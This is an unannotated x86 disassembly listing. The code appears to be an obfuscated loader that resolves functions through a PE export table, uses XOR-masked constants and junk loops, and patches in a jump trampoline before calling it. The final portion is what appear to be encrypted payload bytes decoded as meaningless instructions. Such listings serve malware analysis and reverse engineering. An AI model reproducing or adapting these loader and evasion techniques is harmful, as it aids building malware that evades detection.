  4051e1:	mov    eax,DWORD PTR [ebp-0x4]
  4051e4:	mov    ecx,DWORD PTR [ebp-0x14]
  4051e7:	xor    eax,esi
  4051e9:	add    eax,edi
  4051eb:	cmp    ecx,eax
  4051ed:	je     0x4052d3
  4051f3:	push   DWORD PTR [ebp-0x14]
  4051f6:	push   DWORD PTR [ebp+0x8]
  4051f9:	call   0x40ea45
  4051fe:	mov    DWORD PTR [ebp-0x14],eax
  405201:	mov    eax,DWORD PTR [ebp-0x4]
  405204:	mov    ecx,DWORD PTR [ebp-0x14]
  405207:	xor    eax,esi
  405209:	add    eax,edi
  40520b:	cmp    ecx,eax
  40520d:	je     0x4052d3
  405213:	mov    eax,DWORD PTR [ebp-0x14]
  405216:	mov    eax,DWORD PTR [eax+0x18]
  405219:	mov    DWORD PTR [ebp-0x24],eax
  40521c:	mov    eax,DWORD PTR [ebp-0x14]
  40521f:	mov    ecx,DWORD PTR [ebp+0x8]
  405222:	add    ecx,DWORD PTR [eax+0x20]
  405225:	mov    DWORD PTR [ebp-0x2c],ecx
  405228:	mov    eax,DWORD PTR [ebp-0x14]
  40522b:	mov    ecx,DWORD PTR [ebp+0x8]
  40522e:	add    ecx,DWORD PTR [eax+0x24]
  405231:	mov    DWORD PTR [ebp-0x34],ecx
  405234:	mov    eax,DWORD PTR [ebp-0x14]
  405237:	mov    ecx,DWORD PTR [ebp+0x8]
  40523a:	add    ecx,DWORD PTR [eax+0x1c]
  40523d:	mov    DWORD PTR [ebp-0x14],ecx
  405240:	jmp    0x40529b
  405245:	mov    eax,DWORD PTR [ebp-0x2c]
  405248:	mov    ecx,DWORD PTR [ebp+0x8]
  40524b:	add    ecx,DWORD PTR [eax+ebx*4]
  40524e:	mov    DWORD PTR [ebp-0x28],ecx
  405251:	mov    eax,DWORD PTR [ebp-0x4]
  405254:	mov    ecx,DWORD PTR [ebp-0x28]
  405257:	xor    eax,esi
  405259:	add    eax,edi
  40525b:	cmp    ecx,eax
  40525d:	je     0x40529b
  405263:	jmp    0x40528c
  405268:	mov    eax,DWORD PTR [ebp-0x4]
  40526b:	mov    ecx,DWORD PTR [ebp-0x8]
  40526e:	xor    eax,esi
  405270:	add    eax,edi
  405272:	cmp    ecx,eax
  405274:	mov    eax,DWORD PTR [ebp-0x4]
  405277:	je     0x4052d6
  40527d:	mov    ecx,DWORD PTR [ebp-0x30]
  405280:	xor    eax,esi
  405282:	add    eax,edi
  405284:	cmp    ecx,eax
  405286:	je     0x4052df
  40528c:	lea    eax,[ebp-0x8]
  40528f:	push   eax
  405290:	push   DWORD PTR [ebp-0x28]
  405293:	push   DWORD PTR [ebp+0xc]
  405296:	call   0x40eccc
  40529b:	mov    eax,DWORD PTR [ebp-0x4]
  40529e:	mov    ecx,DWORD PTR [ebp-0x8]
  4052a1:	xor    eax,esi
  4052a3:	add    eax,edi
  4052a5:	cmp    ecx,eax
  4052a7:	je     0x4052c2
  4052ad:	mov    eax,DWORD PTR [ebp-0x34]
  4052b0:	movzx  eax,WORD PTR [eax+ebx*2]
  4052b4:	mov    ecx,DWORD PTR [ebp-0x14]
  4052b7:	mov    eax,DWORD PTR [ecx+eax*4]
  4052ba:	mov    DWORD PTR [ebp-0x38],eax
  4052bd:	jmp    0x405268
  4052c2:	mov    eax,DWORD PTR [ebp-0xc]
  4052c5:	xor    eax,esi
  4052c7:	lea    ebx,[ebx+eax*1+0x3272e2]
  4052ce:	jmp    0x404fb8
  4052d3:	mov    eax,DWORD PTR [ebp-0x4]
  4052d6:	xor    eax,esi
  4052d8:	add    eax,edi
  4052da:	jmp    0x4053fc
  4052df:	mov    eax,DWORD PTR [ebp-0x38]
  4052e2:	add    eax,DWORD PTR [ebp+0x8]
  4052e5:	mov    DWORD PTR [ebp-0x18],eax
  4052e8:	mov    eax,DWORD PTR [ebp-0x1c]
  4052eb:	test   eax,eax
  4052ed:	je     0x405387
  4052f3:	mov    DWORD PTR [ebp-0x20],0x0
  4052fa:	push   0x3
  4052fc:	xor    edx,edx
  4052fe:	pop    edx
  4052ff:	add    edx,0x8
  405302:	push   edx
  405303:	pop    ecx
  405304:	push   0x6
  405306:	dec    ecx
  405307:	pop    ebx
  405308:	dec    ebx
  405309:	xchg   ebx,ecx
  40530b:	sub    ebx,ecx
  40530d:	xchg   ebx,ecx
  40530f:	dec    ecx
  405310:	mov    eax,DWORD PTR [ebp-0x1c]
  405313:	imul   eax,ecx
  405316:	sub    esp,eax
  405318:	mov    DWORD PTR [ebp-0x20],esp
  40531b:	mov    eax,DWORD PTR [ebp-0x4]
  40531e:	xor    eax,esi
  405320:	add    eax,edi
  405322:	jmp    0x405360
  405327:	mov    ecx,DWORD PTR [ebp-0xc]
  40532a:	mov    eax,DWORD PTR [ebp+0x8]
  40532d:	mov    edx,DWORD PTR [ebp+0x14]
  405330:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  405334:	xor    ecx,esi
  405336:	add    ecx,edi
  405338:	xor    edx,edx
  40533a:	div    ecx
  40533c:	mov    ecx,DWORD PTR [ebp-0x4]
  40533f:	xor    ecx,esi
  405341:	lea    eax,[ecx+eax*1+0x3272e2]
  405348:	mov    ecx,DWORD PTR [ebp+0x8]
  40534b:	mov    edx,DWORD PTR [ebp-0x20]
  40534e:	mov    DWORD PTR [edx+ecx*4],eax
  405351:	mov    eax,DWORD PTR [ebp-0xc]
  405354:	mov    ecx,DWORD PTR [ebp+0x8]
  405357:	xor    eax,esi
  405359:	lea    eax,[eax+ecx*1+0x3272e2]
  405360:	mov    DWORD PTR [ebp+0x8],eax
  405363:	mov    eax,DWORD PTR [ebp-0xc]
  405366:	mov    ecx,DWORD PTR [ebp+0x14]
  405369:	xor    eax,esi
  40536b:	add    eax,edi
  40536d:	imul   eax,DWORD PTR [ecx]
  405370:	mov    ecx,DWORD PTR [ebp-0x4]
  405373:	mov    edx,DWORD PTR [ebp+0x8]
  405376:	xor    ecx,esi
  405378:	lea    ecx,[ecx+edx*1+0x3272e2]
  40537f:	cmp    ecx,eax
  405381:	jne    0x405327
  405387:	mov    eax,DWORD PTR [ebp-0x4]
  40538a:	xor    eax,esi
  40538c:	add    eax,edi
  40538e:	mov    DWORD PTR [ebp-0x10],eax
  405391:	mov    ebx,0x65655
  405396:	add    ebx,0x3234
  40539c:	xchg   ebx,esi
  40539e:	xor    ebx,ebx
  4053a0:	push   esi
  4053a1:	mov    esi,ebx
  4053a3:	pop    ebx
  4053a4:	mov    edx,esi
  4053a6:	add    ebx,0x1002
  4053ac:	lea    eax,[ebp-0x18]
  4053af:	add    edx,eax
  4053b1:	add    edx,0x5
  4053b4:	push   edx
  4053b5:	inc    esi
  4053b6:	pop    ecx
  4053b7:	dec    ecx
  4053b8:	xchg   ecx,eax
  4053b9:	dec    eax
  4053ba:	xchg   ecx,eax
  4053bb:	dec    ecx
  4053bc:	xchg   ecx,edx
  4053be:	dec    edx
  4053bf:	push   edx
  4053c0:	mov    edx,ebx
  4053c2:	pop    ebx
  4053c3:	dec    ebx
  4053c4:	call   DWORD PTR [ebx]
  4053c6:	cmp    DWORD PTR [ebp+0x10],esi
  4053c9:	je     0x4053e8
  4053cf:	xchg   edx,eax
  4053d0:	push   0xb
  4053d2:	pop    ecx
  4053d3:	push   0x4
  4053d5:	pop    ebx
  4053d6:	inc    ebx
  4053d7:	xchg   ebx,ecx
  4053d9:	sub    ebx,ecx
  4053db:	xchg   ebx,ecx
  4053dd:	dec    ecx
  4053de:	dec    ecx
  4053df:	mov    eax,DWORD PTR [ebp-0x1c]
  4053e2:	imul   eax,ecx
  4053e5:	add    esp,eax
  4053e7:	xchg   edx,eax
  4053e8:	push   eax
  4053e9:	xor    ebx,ebx
  4053eb:	mov    edx,esp
  4053ed:	dec    edx
  4053ee:	inc    ebx
  4053ef:	add    ebx,DWORD PTR [edx+ebx*1]
  4053f2:	dec    ebx
  4053f3:	xor    edx,edx
  4053f5:	add    DWORD PTR [ebp-0x10],ebx
  4053f8:	pop    ebx
  4053f9:	mov    eax,DWORD PTR [ebp-0x10]
  4053fc:	pop    edi
  4053fd:	pop    esi
  4053fe:	pop    ebx
  4053ff:	leave  
  405400:	ret    0x10
  405403:	push   ebp
  405404:	mov    ebp,esp
  405406:	sub    esp,0x7c
  405409:	mov    DWORD PTR ds:0x42c018,0x17
  405413:	cmp    DWORD PTR ds:0x42c018,0x0
  40541a:	je     0x40544a
  405420:	cmp    DWORD PTR ds:0x42c018,0x20
  405427:	jne    0x405438
  40542d:	push   0x8a80
  405432:	call   DWORD PTR ds:0x42e8cb
  405438:	mov    eax,ds:0x42c018
  40543d:	dec    eax
  40543e:	mov    ds:0x42c018,eax
  405443:	jmp    0x405413
  405448:	adc    eax,ecx
  40544a:	push   esi
  40544b:	sub    esi,0x3b9
  405451:	push   edi
  405452:	mov    edi,DWORD PTR ds:0x41ce18
  405458:	mov    eax,ds:0x41cd89
  40545d:	sub    edi,eax
  40545f:	add    edi,DWORD PTR [edi+eax*1]
  405462:	mov    eax,ds:0x42e2b7
  405467:	and    DWORD PTR ds:0x42b018,0x0
  405471:	jmp    0x405483
  405476:	mov    ecx,DWORD PTR ds:0x42b018
  40547c:	inc    ecx
  40547d:	mov    DWORD PTR ds:0x42b018,ecx
  405483:	cmp    DWORD PTR ds:0x42b018,0x10
  40548a:	jae    0x4054d5
  405490:	cmp    DWORD PTR ds:0x42b018,0x5
  405497:	jne    0x4054b3
  40549d:	push   0x429020
  4054a2:	push   DWORD PTR [ebp-0x20]
  4054a5:	push   DWORD PTR [ebp-0x20]
  4054a8:	push   0x7ab5
  4054ad:	call   DWORD PTR ds:0x42e8cf
  4054b3:	cmp    DWORD PTR ds:0x42b018,0x4
  4054ba:	jne    0x4054cf
  4054c0:	xor    ecx,ecx
  4054c2:	or     ecx,DWORD PTR ds:0x42b018
  4054c8:	inc    ecx
  4054c9:	mov    DWORD PTR ds:0x42b018,ecx
  4054cf:	jmp    0x405476
  4054d4:	dec    edi
  4054d5:	mov    DWORD PTR [ebp-0x24],eax
  4054d8:	sbb    eax,DWORD PTR ds:0x42d000
  4054de:	mov    eax,ds:0x42e3c3
  4054e3:	mov    DWORD PTR [ebp-0x34],eax
  4054e6:	mov    DWORD PTR ds:0x42c014,0x14
  4054f0:	cmp    DWORD PTR ds:0x42c014,0x0
  4054f7:	je     0x405540
  4054fd:	cmp    DWORD PTR ds:0x42c014,0x2
  405504:	jne    0x405515
  40550a:	push   0x6dea
  40550f:	call   DWORD PTR ds:0x42e913
  405515:	cmp    DWORD PTR ds:0x42c014,0x3
  40551c:	jne    0x405530
  405522:	xor    eax,eax
  405524:	xor    eax,DWORD PTR ds:0x42c014
  40552a:	dec    eax
  40552b:	mov    ds:0x42c014,eax
  405530:	mov    eax,ds:0x42c014
  405535:	dec    eax
  405536:	mov    ds:0x42c014,eax
  40553b:	jmp    0x4054f0
  405540:	and    DWORD PTR [ebp-0x30],0x0
  405544:	mov    eax,ds:0x41cd9d
  405549:	mov    eax,DWORD PTR [eax]
  40554b:	adc    DWORD PTR ds:0x42c010,eax
  405551:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  405558:	add    edi,edi
  40555a:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  405561:	mov    eax,DWORD PTR [ebp-0x10]
  405564:	mov    ecx,DWORD PTR [ebp-0x10]
  405567:	and    DWORD PTR ds:0x42c000,0x0
  405571:	jmp    0x405583
  405576:	mov    edi,DWORD PTR ds:0x42c000
  40557c:	inc    edi
  40557d:	mov    DWORD PTR ds:0x42c000,edi
  405583:	cmp    DWORD PTR ds:0x42c000,0x19
  40558a:	jae    0x4055bb
  405590:	cmp    DWORD PTR ds:0x42c000,0x1c
  405597:	jne    0x4055b0
  40559d:	push   DWORD PTR [ebp-0x20]
  4055a0:	push   0x5aa1
  4055a5:	push   0x4e93
  4055aa:	call   DWORD PTR ds:0x42e8d3
  4055b0:	jmp    0x405576
  4055b5:	and    esi,DWORD PTR ds:0x42b004
  4055bb:	sub    eax,ecx
  4055bd:	adc    DWORD PTR ds:0x42c014,ecx
  4055c3:	mov    DWORD PTR [ebp-0x10],eax
  4055c6:	xor    DWORD PTR [ebp-0x10],0xf89cb585
  4055cd:	sbb    esi,ecx
  4055cf:	mov    eax,DWORD PTR [ebp-0x18]
  4055d2:	mov    ecx,DWORD PTR [ebp-0x18]
  4055d5:	or     DWORD PTR ds:0x42a00c,ecx
  4055db:	sub    eax,ecx
  4055dd:	mov    DWORD PTR [ebp-0x18],eax
  4055e0:	or     DWORD PTR [ebp-0x18],0xf89f0585
  4055e7:	add    esi,DWORD PTR ds:0x42b018
  4055ed:	mov    eax,DWORD PTR [ebp-0xc]
  4055f0:	xor    edi,edi
  4055f2:	xor    edi,DWORD PTR ds:0x41cdd8
  4055f8:	mov    esi,DWORD PTR ds:0x41ce34
  4055fe:	sub    esi,edi
  405600:	imul   edi,DWORD PTR [edi+esi*1]
  405604:	mov    ecx,DWORD PTR [ebp-0xc]
  405607:	mov    DWORD PTR ds:0x429020,0x15
  405611:	cmp    DWORD PTR ds:0x429020,0x0
  405618:	je     0x40566c
  40561e:	cmp    DWORD PTR ds:0x429020,0xb
  405625:	jne    0x40563e
  40562b:	push   DWORD PTR [ebp-0x24]
  40562e:	push   0x42e000
  405633:	push   0x429018
  405638:	call   DWORD PTR ds:0x42e917
  40563e:	cmp    DWORD PTR ds:0x429020,0xc
  405645:	jne    0x40565a
  40564b:	xor    esi,esi
  40564d:	or     esi,DWORD PTR ds:0x429020
  405653:	dec    esi
  405654:	mov    DWORD PTR ds:0x429020,esi
  40565a:	mov    esi,DWORD PTR ds:0x429020
  405660:	dec    esi
  405661:	mov    DWORD PTR ds:0x429020,esi
  405667:	jmp    0x405611
  40566c:	sub    eax,ecx
  40566e:	mov    DWORD PTR [ebp-0xc],eax
  405671:	or     DWORD PTR [ebp-0xc],0xf89c85c5
  405678:	mov    eax,DWORD PTR [ebp-0x1c]
  40567b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40567e:	sub    eax,ecx
  405680:	mov    DWORD PTR [ebp-0x1c],eax
  405683:	or     DWORD PTR [ebp-0x1c],0xf89c85a5
  40568a:	mov    eax,DWORD PTR [ebp-0x20]
  40568d:	mov    ecx,DWORD PTR [ebp-0x20]
  405690:	sub    eax,ecx
  405692:	mov    DWORD PTR [ebp-0x20],eax
  405695:	mov    eax,DWORD PTR [ebp-0x2c]
  405698:	mov    ecx,DWORD PTR [ebp-0x20]
  40569b:	mov    esi,0x751089b
  4056a0:	xor    eax,esi
  4056a2:	mov    edi,0x3272e2
  4056a7:	add    eax,edi
  4056a9:	or     eax,ecx
  4056ab:	mov    DWORD PTR [ebp-0x20],eax
  4056ae:	mov    eax,DWORD PTR [ebp-0x4]
  4056b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4056b4:	sub    eax,ecx
  4056b6:	mov    DWORD PTR [ebp-0x4],eax
  4056b9:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  4056c0:	mov    eax,DWORD PTR [ebp-0xc]
  4056c3:	xor    eax,esi
  4056c5:	add    eax,edi
  4056c7:	push   eax
  4056c8:	mov    eax,DWORD PTR [ebp-0x10]
  4056cb:	xor    eax,esi
  4056cd:	add    eax,edi
  4056cf:	push   eax
  4056d0:	mov    eax,DWORD PTR [ebp-0x4]
  4056d3:	xor    eax,esi
  4056d5:	add    eax,edi
  4056d7:	push   eax
  4056d8:	lea    eax,[ebp-0x7c]
  4056db:	push   eax
  4056dc:	push   DWORD PTR [ebp-0x2c]
  4056df:	push   DWORD PTR [ebp-0x28]
  4056e2:	call   0x40ebe9
  4056e7:	test   eax,eax
  4056e9:	je     0x405717
  4056ef:	lea    eax,[ebp-0x7c]
  4056f2:	push   eax
  4056f3:	mov    eax,DWORD PTR [ebp-0x28]
  4056f6:	xor    eax,esi
  4056f8:	add    eax,edi
  4056fa:	push   eax
  4056fb:	mov    eax,DWORD PTR [ebp-0x24]
  4056fe:	add    eax,0xaa
  405703:	push   eax
  405704:	mov    eax,DWORD PTR [ebp-0x24]
  405707:	mov    eax,DWORD PTR [eax+0x198]
  40570d:	push   DWORD PTR [eax]
  40570f:	call   0x40294c
  405714:	mov    DWORD PTR [ebp-0x14],eax
  405717:	lea    eax,[ebp+0x4]
  40571a:	mov    DWORD PTR [ebp-0x30],eax
  40571d:	mov    eax,DWORD PTR [ebp-0x14]
  405720:	test   eax,eax
  405722:	je     0x40578a
  405728:	lea    eax,[ebp-0x8]
  40572b:	mov    DWORD PTR [ebp-0x38],eax
  40572e:	mov    eax,DWORD PTR [ebp-0x34]
  405731:	mov    DWORD PTR [ebp-0x8],eax
  405734:	mov    eax,DWORD PTR [ebp-0x8]
  405737:	mov    ecx,DWORD PTR [ebp-0x14]
  40573a:	sub    eax,ecx
  40573c:	mov    DWORD PTR [ebp-0x8],eax
  40573f:	mov    ecx,DWORD PTR [ebp-0x4]
  405742:	xor    ecx,esi
  405744:	mov    eax,0xffcd8d1e
  405749:	sub    eax,ecx
  40574b:	add    DWORD PTR [ebp-0x8],eax
  40574e:	mov    eax,DWORD PTR [ebp-0x8]
  405751:	mov    ecx,DWORD PTR [ebp-0x14]
  405754:	mov    DWORD PTR [ecx+0x1],eax
  405757:	mov    eax,DWORD PTR [ebp-0x14]
  40575a:	push   DWORD PTR [ebp-0x24]
  40575d:	mov    BYTE PTR [eax],0xe9
  405760:	mov    eax,ds:0x42e133
  405765:	push   DWORD PTR [eax]
  405767:	push   DWORD PTR ds:0x42e38f
  40576d:	push   DWORD PTR ds:0x42e13b
  405773:	push   DWORD PTR ds:0x42e36f
  405779:	push   DWORD PTR ds:0x42e683
  40577f:	push   DWORD PTR [ebp-0x28]
  405782:	push   DWORD PTR [ebp-0x2c]
  405785:	mov    eax,DWORD PTR [ebp-0x14]
  405788:	call   eax
  40578a:	mov    eax,DWORD PTR [ebp-0x30]
  40578d:	mov    ecx,DWORD PTR ds:0x42e333
  405793:	add    DWORD PTR [eax],ecx
  405795:	pop    edi
  405796:	pop    esi
  405797:	leave  
  405798:	ret    
  405799:	push   ebp
  40579a:	mov    ebp,esp
  40579c:	sub    esp,0x18
  40579f:	mov    DWORD PTR ds:0x429014,0x19
  4057a9:	cmp    DWORD PTR ds:0x429014,0x0
  4057b0:	je     0x405814
  4057b6:	cmp    DWORD PTR ds:0x429014,0xd
  4057bd:	jne    0x4057d5
  4057c3:	push   DWORD PTR [ebp-0x20]
  4057c6:	push   DWORD PTR [ebp-0x24]
  4057c9:	push   DWORD PTR [ebp-0x24]
  4057cc:	push   DWORD PTR [ebp-0x28]
  4057cf:	call   DWORD PTR ds:0x42e8d7
  4057d5:	cmp    DWORD PTR ds:0x429014,0xe
  4057dc:	jne    0x4057f1
  4057e2:	xor    edx,edx
  4057e4:	xor    edx,DWORD PTR ds:0x429014
  4057ea:	dec    edx
  4057eb:	mov    DWORD PTR ds:0x429014,edx
  4057f1:	mov    edx,DWORD PTR ds:0x429014
  4057f7:	dec    edx
  4057f8:	mov    DWORD PTR ds:0x429014,edx
  4057fe:	jmp    0x4057a9
  405803:	mov    ecx,DWORD PTR ds:0x41cd6d
  405809:	mov    edx,DWORD PTR ds:0x41cd85
  40580f:	sub    edx,ecx
  405811:	and    ecx,DWORD PTR [ecx+edx*1]
  405814:	mov    DWORD PTR [ebp-0x10],0xf89f8585
  40581b:	sub    DWORD PTR ds:0x42d00c,0x7538
  405825:	lea    eax,[ebp+0x14]
  405828:	mov    DWORD PTR [ebp-0x4],eax
  40582b:	movzx  edx,WORD PTR ds:0x42b014
  405832:	sbb    DWORD PTR ds:0x42d01c,edx
  405838:	push   esi
  405839:	mov    esi,0xf89c8585
  40583e:	mov    edx,DWORD PTR ds:0x42d008
  405844:	and    DWORD PTR ds:0x42c010,edx
  40584a:	mov    DWORD PTR [ebp-0xc],esi
  40584d:	sbb    DWORD PTR ds:0x42900c,0x3284
  405857:	lea    eax,[ebp-0xc]
  40585a:	add    DWORD PTR ds:0x429024,0x6cdb
  405864:	mov    DWORD PTR [ebp-0x14],eax
  405867:	neg    eax
  405869:	mov    eax,DWORD PTR [ebp-0xc]
  40586c:	sbb    ecx,0x367b
  405872:	mov    edx,DWORD PTR [ebp-0x14]
  405875:	mov    ecx,0x751089b
  40587a:	sbb    DWORD PTR ds:0x42900c,0x429014
  405884:	xor    eax,ecx
  405886:	and    DWORD PTR ds:0x429014,0x429028
  405890:	add    eax,0x3272e2
  405895:	mov    DWORD PTR [edx],eax
  405897:	adc    edx,DWORD PTR ds:0x42d014
  40589d:	mov    eax,ds:0x42e12f
  4058a2:	adc    edx,DWORD PTR ds:0x42d008
  4058a8:	mov    edx,DWORD PTR [ebp-0x4]
  4058ab:	mov    eax,DWORD PTR [eax]
  4058ad:	xor    DWORD PTR ds:0x42b000,0x42a008
  4058b7:	add    eax,DWORD PTR [edx]
  4058b9:	push   edi
  4058ba:	and    edx,DWORD PTR ds:0x42a00c
  4058c0:	mov    DWORD PTR [ebp-0x8],eax
  4058c3:	movzx  eax,WORD PTR ds:0x42b000
  4058ca:	sub    DWORD PTR ds:0x42a010,eax
  4058d0:	mov    edi,DWORD PTR [ebp+0x8]
  4058d3:	xor    DWORD PTR ds:0x429018,0x6981
  4058dd:	jmp    0x407c2c
  4058e2:	mov    dh,0x31
  4058e4:	mov    ecx,0xb277bb1f
  4058e9:	jno    0x405908
  4058eb:	push   edi
  4058ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058ed:	xor    DWORD PTR [ebx+0x347cbdae],eax
  4058f3:	pop    edi
  4058f4:	jl     0x405972
  4058f6:	dec    esi
  4058f7:	pop    edi
  4058f8:	jl     0x405976
  4058fa:	cmp    BYTE PTR [ebx],al
  4058fc:	outs   dx,DWORD PTR ds:[esi]
  4058fd:	sub    DWORD PTR [ebx],edi
  4058ff:	ss pop eax
  405901:	mov    bl,0x78
  405903:	mov    eax,ds:0x68f4e904
  405908:	psrld  mm3,mm5
  40590b:	call   0x5a67511b
  405910:	ins    DWORD PTR es:[edi],dx
  405911:	scas   eax,DWORD PTR es:[edi]
  405912:	loope  0x4058f9
  405914:	or     DWORD PTR [ebp-0x57],0xffffffed
  405918:	mov    ds:0x4016e415,al
  40591d:	loopne 0x4058c5
  40591f:	aaa    
  405920:	iret   
  405921:	jno    0x405960
  405923:	daa    
  405924:	call   0x9565fff1
  405929:	mov    cl,0xca
  40592b:	jp     0x4058e7
  40592d:	int3   
  40592e:	sbb    al,0x59
  405930:	adc    esp,DWORD PTR [eax+0x4f]
  405933:	mov    ah,0xc1
  405935:	cmp    ebp,DWORD PTR [ecx+ebx*8]
  405938:	bound  ebx,QWORD PTR [ebp-0x7c]
  40593b:	xor    edi,DWORD PTR [edx]
  40593d:	popa   
  40593e:	imul   ebx,DWORD PTR [ecx+edx*2+0x6],0x33
  405943:	xor    ch,BYTE PTR [ecx-0x400924d]
  405949:	inc    esi
  40594a:	cmp    BYTE PTR [edi],al
  40594c:	inc    edi
  40594d:	in     al,dx
  40594e:	ror    ecx,0xe7
  405951:	and    eax,edx
  405953:	jp     0x405975
  405955:	int3   
  405956:	jno    0x405989
  405958:	mov    dh,0x48
  40595a:	inc    eax
  40595b:	int3   
  40595c:	adc    esi,eax
  40595e:	pop    ebx
  40595f:	mov    cs,WORD PTR [edx+0x7d]
  405962:	and    DWORD PTR [edx-0x1b],ebx
  405965:	sbb    BYTE PTR [ebx-0x61],dl
  405968:	xchg   BYTE PTR [eax],ah
  40596a:	push   es
  40596b:	jno    0x4059d3
  40596d:	sbb    dh,0x5a
  405970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405971:	call   0xb287a168
  405976:	ja     0x4059da
  405978:	mov    eax,ds:0x19360c62
  40597d:	cmp    al,0xbe
  40597f:	sbb    ch,bh
  405981:	push   ecx
  405982:	test   al,0xbb
  405984:	repnz sbb DWORD PTR [ebx+edi*8],0xf3229e16
  40598c:	mov    bl,0x4f
  40598e:	pop    ds
  40598f:	ss into 
  405991:	sbb    BYTE PTR ds:0x9c21eb0c,al
  405997:	setnp  BYTE PTR [esi]
  40599a:	and    esi,DWORD PTR [eax*4-0x4716839a]
  4059a1:	or     eax,0xe1e91685
  4059a6:	fucom  st(3)
  4059a8:	imul   ecx,DWORD PTR [esp+edi*4],0x6e
  4059ac:	lods   al,BYTE PTR ds:[esi]
  4059ad:	dec    esi
  4059ae:	loope  0x40596d
  4059b0:	in     al,0xb8
  4059b2:	cmp    cl,dh
  4059b4:	or     eax,0x8c048b56
  4059b9:	cmp    esi,DWORD PTR [esp+esi*2+0xa5f55f8]
  4059c0:	add    DWORD PTR [edx+0x72],0x6312e501
  4059c7:	cmp    BYTE PTR gs:[edx+0xb],bh
  4059cb:	repnz dec ecx
  4059cd:	dec    eax
  4059ce:	pop    edi
  4059cf:	(bad)  
  4059d0:	dec    edi
  4059d1:	inc    ecx
  4059d2:	cmp    ebp,DWORD PTR [ebp+0x5dcf40e4]
  4059d8:	popf   
  4059d9:	push   ss
  4059da:	iret   
  4059db:	repz dec esp
  4059dd:	and    bl,BYTE PTR [ecx-0x58]
  4059e0:	dec    edx
  4059e1:	jp     0x405972
  4059e3:	repz clc 
  4059e5:	cmp    ecx,DWORD PTR [ecx+0x2ddf7672]
  4059eb:	push   0x6be1a55b
  4059f0:	xchg   DWORD PTR [ebp-0x1b],esi
  4059f3:	test   cl,dl
  4059f5:	mul    DWORD PTR [ebx+0x21]
  4059f8:	gs out 0xa7,al
  4059fb:	in     al,dx
  4059fc:	mov    bh,0xa
  4059fe:	sbb    BYTE PTR [esi-0x45],bl
  405a01:	jns    0x405a2a
  405a03:	xchg   edi,eax
  405a04:	jmp    0x565e6af6
  405a09:	pop    edi
  405a0a:	into   
  405a0b:	stos   DWORD PTR es:[edi],eax
  405a0c:	mov    al,ds:0x70d170b4
  405a11:	inc    ebp
  405a12:	jae    0x4059b0
  405a14:	pop    edi
  405a15:	push   ds
  405a16:	pop    es
  405a17:	push   es
  405a18:	inc    esi
  405a19:	ins    DWORD PTR es:[edi],dx
  405a1a:	adc    BYTE PTR [edx],ch
  405a1c:	les    eax,FWORD PTR [eax]
  405a1e:	mov    ah,0x19
  405a20:	sub    DWORD PTR [ecx],esp
  405a22:	or     esp,DWORD PTR [ebx+eiz*2]
  405a25:	adc    ebp,esi
  405a27:	mov    BYTE PTR ds:0x427df52f,ah
  405a2d:	ficom  WORD PTR [ebp+0x5]
  405a30:	jmp    0xd30c619
  405a35:	pop    ebp
  405a36:	ins    BYTE PTR es:[edi],dx
  405a37:	dec    ecx
  405a38:	jmp    0x405a72
  405a3a:	(bad)  
  405a3c:	mov    esi,0x4f948304
  405a41:	nop
  405a42:	mov    DWORD PTR [eax+0x350989b8],0xc04cf93
  405a4c:	dec    ecx
  405a4d:	sub    ah,0xd7
  405a50:	retf   0xedd8
  405a53:	jmp    0x623f0f62
  405a58:	sbb    eax,0x8754043d
  405a5d:	arpl   si,dx
  405a5f:	jmp    0x1f3c:0x3246641d
  405a66:	jge    0x405a13
  405a68:	or     bl,ah
  405a6a:	jge    0x405ac6
  405a6c:	jmp    0x89bf:0x671ce625
  405a73:	cli    
  405a74:	mov    al,ds:0xa52d658e
  405a79:	mov    esp,0xd75e3b39
  405a7e:	xchg   edx,ebp
  405a80:	push   cs
  405a81:	mov    DWORD PTR [eax],eax
  405a83:	loop   0x405a3a
  405a85:	dec    esi
  405a86:	and    DWORD PTR [esi-0x6a],edi
  405a89:	mov    esp,ebx
  405a8b:	xlat   BYTE PTR ds:[ebx]
  405a8c:	sbb    al,0x93
  405a8e:	mov    ds:0xfa4d5855,al
  405a93:	mov    cs,WORD PTR [ebx+0x4232499]
  405a99:	add    DWORD PTR [edx+0x7d255672],ecx
  405a9f:	aas    
  405aa0:	adc    ebp,DWORD PTR [edx-0x58]
  405aa3:	rol    BYTE PTR [esi],1
  405aa5:	outs   dx,DWORD PTR ds:[esi]
  405aa6:	jo     0x405b00
  405aa8:	inc    ebx
  405aa9:	jo     0x405b14
  405aab:	ja     0x405b18
  405aad:	shl    BYTE PTR [edi],1
  405aaf:	mov    ch,0x67
  405ab1:	add    eax,DWORD PTR [eax]
  405ab3:	data16 ror dl,0x93
  405ab7:	scas   eax,DWORD PTR es:[edi]
  405ab8:	mov    ch,0x23
  405aba:	cmp    BYTE PTR [edi-0x5837b616],0x88
  405ac1:	mov    edi,0x4c3fd66e
  405ac6:	xchg   bl,ah
  405ac8:	mov    es,WORD PTR [ecx+0x7c8aa6a7]
  405ace:	xor    eax,0xcd260ff9
  405ad3:	add    ah,0xd8
  405ad6:	sti    
  405ad7:	shr    BYTE PTR [eax-0x27147d85],0x57
  405ade:	pop    esi
  405adf:	xor    BYTE PTR [edi],ah
  405ae1:	push   esp
  405ae2:	out    dx,eax
  405ae3:	std    
  405ae4:	jmp    0x405ac3
  405ae6:	sbb    bh,bh
  405ae8:	fild   DWORD PTR [eax+0x26]
  405aeb:	and    esi,DWORD PTR [edx]
  405aed:	inc    ecx
  405aee:	adc    eax,0x59b822c4
  405af3:	cmp    eax,DWORD PTR [bx+si-0x2af8]
  405af8:	pop    es
  405af9:	xor    dl,BYTE PTR [edi]
  405afb:	add    DWORD PTR [ebx],ecx
  405afd:	call   0x330649cb
  405b02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b03:	or     eax,0xe063d33b
  405b08:	(bad)  
  405b09:	mov    cl,0x95
  405b0b:	sbb    bh,0x5d
  405b0e:	loopne 0x405b60
  405b10:	scas   al,BYTE PTR es:[edi]
  405b11:	push   esp
  405b12:	call   0xfa03:0x16933945
  405b19:	inc    edx
  405b1a:	jnp    0x405b81
  405b1c:	pop    edx
